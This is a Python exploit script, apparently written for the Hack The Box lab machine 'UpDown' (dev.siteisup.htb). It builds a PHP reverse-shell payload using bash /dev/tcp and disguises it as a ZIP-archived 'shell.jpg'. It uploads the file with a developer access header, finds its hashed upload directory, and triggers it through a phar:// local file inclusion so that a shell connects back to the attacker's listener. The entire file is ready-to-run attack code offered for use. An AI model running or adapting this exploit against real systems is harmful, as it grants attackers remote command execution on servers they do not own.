import requests
import re
import os
import subprocess
import time
import argparse

BANNER = r"""
 ___  ___  ________  ________  ________  ___       __  ________     
|\  \|\  \|\   __  \|\   ___ \|\   __  \|\  \     |\  \|\   ___  \   
\ \  \\\  \ \  \|\  \ \  \_|\ \ \  \|\  \ \  \     \ \  \ \  \\ \  \  
 \ \  \\\  \ \   ____\ \  \ \\ \ \  \\\  \ \  \  __\ \  \ \  \\ \  \ 
  \ \  \\\  \ \  \___|\ \  \_\\ \ \  \\\  \ \  \|\__\_\  \ \  \\ \  \
   \ \_______\ \__\    \ \_______\ \_______\ \____________\ \__\\ \__\
    \|_______|\|__|     \|_______|\|_______|\|____________|\|__| \|__|
"""

TARGET = "http://dev.siteisup.htb/index.php"
UPLOADS = "http://dev.siteisup.htb/uploads/"
HEADERS = {
    "Special-Dev": "only4dev",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0)"
}

def create_payload(ip, port):
    print(f"[*] Creating ZIP payload for {ip}:{port}...")
    for f in ["shell.php", "shell.jpg"]:
        if os.path.exists(f): os.remove(f)

    payload = f"""<?php
    $cmd = "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'";
    proc_open($cmd, [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $p);
    ?>"""

    with open("shell.php", "w") as f:
        f.write(payload)
    
    subprocess.run(["zip", "shell.jpg", "shell.php"], capture_output=True)
    print("[+] shell.jpg created.")

def exploit(ip, port):
    print(BANNER)
    create_payload(ip, port)
    
    print("[*] Uploading...")
    with open("shell.jpg", "rb") as f:
        try:
            requests.post(f"{TARGET}?page=checker", headers=HEADERS, files={'file': ('shell.jpg', f)}, data={'check': 'Check'}, timeout=2)
        except:
            pass

    time.sleep(1)
    r = requests.get(UPLOADS, headers=HEADERS)
    hashes = re.findall(r'[a-f0-9]{32}', r.text)

    if not hashes:
        print("[-] Directory not found.")
        return

    h = hashes[-1]
    trigger = f"{TARGET}?page=phar://uploads/{h}/shell.jpg/shell"
    
    print(f"[!] Triggering LFI: {trigger}")
    print(f"[*] Check your listener at port: {port}")
    
    try:
        requests.get(trigger, headers=HEADERS, timeout=3)
    except:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UpDown Exploit")
    parser.add_argument("ip", help="Listener IP (tun0)")
    parser.add_argument("port", help="Listener Port")
    args = parser.parse_args()

    try:
        exploit(args.ip, args.port)
    finally:
        for f in ["shell.php", "shell.jpg"]:
            if os.path.exists(f): os.remove(f)
